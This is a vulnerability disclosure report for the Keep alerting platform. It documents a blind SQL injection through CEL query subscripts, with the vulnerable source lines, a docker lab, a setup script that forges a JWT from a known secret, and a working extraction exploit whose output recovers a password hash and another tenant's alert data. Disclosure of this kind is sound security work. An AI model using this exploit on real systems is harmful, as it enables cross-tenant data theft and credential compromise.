# Keep Vulnerability Report

Software: Keep

Developer or vendor: Keephq

Code repository: https://github.com/keephq/keep

## 1. Boolean-Based Blind SQL Injection in CEL Queries

Brief description: An account with `read:alert` permission can inject SQL through the JSON subscript of a CEL query.

Affected versions: 0.34.10 to 0.54.3

Preconditions: The attacker has an account with `read:alert` permission, and at least one alert exists.

### Root Cause

The alert query endpoint `/alerts/query` accepts CEL expressions. CEL's bracket syntax accesses JSON fields, and the string inside the brackets becomes part of the property path. The converter appends this string to the property path directly:

```python
# keep/api/core/cel_to_sql/cel_ast_converter.py:278-288    commit e5cd8698c8
def member_index(self, tree: lark.Tree) -> None:
    right = self.stack.pop()
    left = self.stack.pop()

    if isinstance(right, ConstantNode):
        right = right.value

    prop_access_node: PropertyAccessNode = left
    new_property_access_node = PropertyAccessNode(
        path=prop_access_node.path + [str(right)]
    )
    self.stack.append(new_property_access_node)
    self.member_access_stack.append(new_property_access_node)
```

The alert field mapping contains a wildcard entry, so any field not explicitly declared in the mapping falls into the two JSON columns `alert.event` and `alertenrichment.enrichments`:

```python
# keep/api/core/alerts.py:151-160    commit e5cd8698c8
    FieldMappingConfiguration(
        map_from_pattern="*",
        map_to=[
            "JSON(alertenrichment.enrichments).*",
            "JSON(alert.event).*",
        ],
        data_type=DataType.STRING,
    ),
```

When generating the JSON extraction expression, the SQL providers put the path segment directly into a single-quoted string without escaping. The SQLite implementation is:

```python
# keep/api/core/cel_to_sql/sql_providers/sqlite.py:16-18    commit e5cd8698c8
def json_extract_as_text(self, column: str, path: list[str]) -> str:
    property_path_str = ".".join([f'"{item}"' for item in path])
    return f"json_extract({column}, '$.{property_path_str}')"
```

The PostgreSQL and MySQL implementations are at `keep/api/core/cel_to_sql/sql_providers/postgresql.py:22` and `keep/api/core/cel_to_sql/sql_providers/mysql.py:57`, and they likewise do not escape the path.

The single quote inside the brackets therefore closes the JSON path string, and the rest becomes SQL. For the `alertenrichment.enrichments` column, the payload `labels["x') OR (1=1) OR ('"]` produces this expression on SQLite:

```sql
json_extract(alertenrichment.enrichments, '$."labels"."x') OR (1=1) OR ('"')
```

Replacing `1=1` with any subquery yields a usable injection point.

`/incidents?cel=` uses the same converter and the same `read:alert` check, so that entry point is exploitable as well.

### Reproduction Environment

The lab uses the official 0.54.3 backend image with SQLite and DB authentication. Create `docker-compose.yml`:

```yaml
name: keep-vuln
services:
  keep-backend:
    image: us-central1-docker.pkg.dev/keephq/keep/keep-api:0.54.3
    ports:
      - "19611:8080"
    environment:
      - AUTH_TYPE=DB
      - KEEP_JWT_SECRET=reportsecret123
      - KEEP_DEFAULT_USERNAME=admin@lab.local
      - KEEP_DEFAULT_PASSWORD=Admin12345.
      - SECRET_MANAGER_TYPE=FILE
      - SECRET_MANAGER_DIRECTORY=/state
      - DATABASE_CONNECTION_STRING=sqlite:////state/db.sqlite3?check_same_thread=False
    volumes:
      - ./state:/state
```

Start the backend:

```bash
mkdir -p state
docker compose up -d
```

The backend listens on `http://127.0.0.1:19611`. After startup, create an administrator and a read-only account, and write some alert data:

```python
import time

import httpx
import jwt

BASE = "http://127.0.0.1:19611"
SECRET = "reportsecret123"

admin = httpx.post(
    BASE + "/signin",
    json={"username": "admin@lab.local", "password": "Admin12345."},
).json()["accessToken"]
headers = {"Authorization": f"Bearer {admin}"}
httpx.post(
    BASE + "/auth/users",
    headers=headers,
    json={
        "email": "noc@lab.local",
        "name": "noc",
        "password": "Noc12345.",
        "role": "noc",
    },
)
victim = jwt.encode(
    {"tenant_id": "victim-tenant", "email": "victim@lab.local", "role": "admin"},
    SECRET,
    algorithm="HS256",
)
httpx.post(
    BASE + "/alerts/event",
    headers={"Authorization": f"Bearer {victim}"},
    json={
        "name": "victim-secret-alert",
        "status": "firing",
        "severity": "critical",
        "message": "tenant-victim-confidential",
    },
)
httpx.post(
    BASE + "/alerts/event",
    headers=headers,
    json={
        "name": "attacker-alert",
        "status": "firing",
        "severity": "info",
        "message": "attacker-normal",
    },
)
time.sleep(3)
```

### Reproduction

Log in as `noc@lab.local` and send CEL queries to `/alerts/query`. The script is:

```python
import string

import httpx

BASE = "http://127.0.0.1:19611"


def login(username, password):
    r = httpx.post(
        BASE + "/signin",
        json={"username": username, "password": password},
        timeout=30,
    )
    r.raise_for_status()
    return {"Authorization": f"Bearer {r.json()['accessToken']}"}


attacker = login("noc@lab.local", "Noc12345.")
print("attacker tenant:", httpx.get(BASE + "/whoami", headers=attacker).json()["tenant_id"])


def oracle(sql):
    cel = "labels[\"x') OR (" + sql + ") OR ('\"]"
    r = httpx.post(
        BASE + "/alerts/query",
        headers=attacker,
        json={"cel": cel, "limit": 1, "offset": 0},
        timeout=30,
    )
    r.raise_for_status()
    return r.json()["count"] > 0


def extract(column, table, length, where=""):
    alphabet = "$./_-" + string.ascii_letters + string.digits
    out = ""
    for i in range(1, length + 1):
        for ch in alphabet:
            sql = (
                f"(SELECT substr({column},{i},1) FROM {table}"
                f" {where} LIMIT 1)='{ch}'"
            )
            if oracle(sql):
                out += ch
                break
        else:
            out += "?"
    return out


print(
    "victim tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='victim-tenant'"),
)
print(
    "nonexistent tenant has alerts:",
    oracle("SELECT count(*) FROM lastalert WHERE tenant_id='does-not-exist'"),
)
print("password hash:", extract("password_hash", "user", 16))
print(
    "victim message:",
    extract(
        "json_extract(event,'$.message')",
        "alert",
        len("tenant-victim-confidential"),
        "WHERE tenant_id='victim-tenant'",
    ),
)
```

The output is:

```text
attacker tenant: keep
victim tenant has alerts: True
nonexistent tenant has alerts: False
password hash: f99bc9050b3f95d8
victim message: tenant-victim-confidential
```
